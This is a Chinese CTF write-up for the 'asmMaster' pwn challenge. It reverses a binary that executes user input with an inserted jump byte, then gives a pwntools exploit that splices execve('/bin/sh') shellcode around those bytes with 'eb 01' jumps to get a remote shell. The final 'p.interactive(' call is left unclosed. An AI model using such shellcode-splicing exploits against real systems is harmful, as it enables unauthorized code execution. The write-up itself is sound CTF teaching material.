---
title: asmMaster - ctfPlus
published: 2026-03-29
description: "shellcode，汇编, 指令滑板"
tags: ["ctfwp", "asm"]
category: ctf
draft: false
---

将题目提供的二进制文件拖入ida 得到如下代码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-28h]
  int n4; // [rsp+Ch] [rbp-24h]
  int n3; // [rsp+10h] [rbp-20h]
  int n10; // [rsp+14h] [rbp-1Ch]
  _BYTE *addr_1; // [rsp+18h] [rbp-18h]
  _BYTE *addr; // [rsp+20h] [rbp-10h]

  setvbuf(_bss_start, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  addr = mmap(0, 0x1000u, 3, 34, -1, 0);
  if ( addr == (_BYTE *)-1LL )
    return 1;
  printf("%p\n", addr);
  addr_1 = addr;
  v4 = 1;
  while ( v4 && addr_1 < addr + 4091 )
  {
    n4 = 0;
    for ( n3 = 0; n3 <= 3; ++n3 )
    {
      n10 = fgetc(stdin);
      if ( n10 == -1 || n10 == 10 )
      {
        v4 = 0;
        break;
      }
      addr_1[n3 + 1] = n10;
      ++n4;
    }
    if ( n4 == 4 )
    {
      *addr_1 = -23;
      addr_1 += 5;
    }
  }
  mprotect(addr, 0x1000u, 5);
  ((void (*)(void))addr)();
  return 0;
}
```

可以发现这是一段执行shellcode 的程序，程序将用户输入的shellcode 按照 4个字节为一组，然后在每一组开头加上 `jmp (E9 , -23)` 的汇编指令，最后将shellcode 按照顺序拼接起来，然后执行。
同时题目给了一个后门函数 getshell，但是由于 泄露的地址和getshell 相差2G的偏移，所以无法直接调用。所以这里采用自己构建shellcode的方式。
我们可以自己生成一个 getshell的 shellcode 然后分组在在每一条指令前面加上 `jmp +1`的相对跳转，越过程序添加jmp 拼凑出shellcode。

:::important
于是得到如下exp
:::

```python
from pwn import *

p = remote('nc1.ctfplus.cn', 28298)
# p = process("./challenge")
e = ELF('./challenge')
p.recvuntil(b'0x')
# 接收泄露地址
leakedAddr = int(p.recv(12), 16)
shellcodeAddr = leakedAddr + 0x100

# 构造原始 payload 为了跳到shellcode
payload = b'\x01\x00\x00\x00' 

#每双字节分块shellcode ai
shellcode = [
    b'\x31\xf6', b'\x56\x90', b'\x31\xc0',
    b'\xb4\x68', b'\xb0\x73', b'\x66\x50',
    b'\xb4\x2f', b'\xb0\x2f', b'\x66\x50',
    b'\xb4\x6e', b'\xb0\x69', b'\x66\x50',
    b'\xb4\x62', b'\xb0\x2f', b'\x66\x50',
    b'\x54\x5f', b'\x31\xd2', b'\x31\xc0', b'\xb0\x3b', b'\x0f\x05'
]

for c in shellcode:
  payload += c + b'\xeb\x01' #eb 01 ; 跳过接下来一字节内容 在这里就是跳过e9
payload += p64(shellcodeAddr)
p.sendline(payload)
#ls
#cat /data/flag\n
p.interactive(
```

总结：
* 主要还是算法
* 在很多情况下 `pwntool` 自带的asm生成工具有局限性
